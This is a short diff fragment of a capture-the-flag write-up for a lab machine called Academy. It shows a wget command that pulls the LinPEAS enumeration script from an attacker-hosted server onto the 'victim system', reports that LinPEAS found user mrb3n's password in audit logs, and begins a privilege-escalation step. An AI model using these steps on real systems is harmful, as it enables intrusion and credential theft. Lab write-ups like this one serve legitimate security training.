@@ -79,9 +79,7 @@ And then we can download the script to the victim system using wget
 wget http://10.10.14.8:8000/linpeas.sh
 ````
 
-LinPEAS shows us some interesting information in /var/log about user mrb3n  
-![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/linpeas%20pass.PNG)
-The script found his password in /var/log/audit logs
+LinPEAS found mrb3n's password in /var/log/audit log file  
 ![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/mrb3n%20pass.jpg)
 
 TF=$(mktemp -d)
